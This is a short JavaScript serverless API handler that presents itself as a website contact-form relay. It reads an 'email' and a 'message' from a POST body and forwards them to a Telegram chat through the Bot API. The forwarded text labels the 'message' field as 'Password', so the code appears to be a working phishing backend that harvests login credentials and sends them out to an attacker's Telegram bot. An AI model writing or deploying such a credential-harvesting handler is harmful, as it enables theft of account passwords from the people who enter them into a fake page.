export default async function handler(req, res) {
  if (req.method !== "POST") {
    return res.status(405).json({
      error: "Method not allowed",
    });
  }

  try {
    const { email, message } = req.body;

    if (!email || !message) {
      return res.status(400).json({
        error: "Missing fields",
      });
    }

    const botToken = process.env.TELEGRAM_BOT_TOKEN;
    const chatId = process.env.TELEGRAM_CHAT_ID;

    const text = `
 ـــــــــــــــــــــــ
  📩 New Website Message
 ـــــــــــــــــــــــ
🎗️Email:
${email}

☠️Password:
${message}
ـــــــــــــــــــــــ`;

    const telegramResponse = await fetch(
      `https://api.telegram.org/bot${botToken}/sendMessage`,
      {
        method: "POST",

        headers: {
          "Content-Type": "application/json",
        },

        body: JSON.stringify({
          chat_id: chatId,
          text: text,
        }),
      },
    );

    if (!telegramResponse.ok) {
      throw new Error("Telegram API error");
    }

    return res.status(200).json({
      success: true,
    });
  } catch (error) {
    console.error(error);

    return res.status(500).json({
      error: "Failed to send message",
    });
  }
}
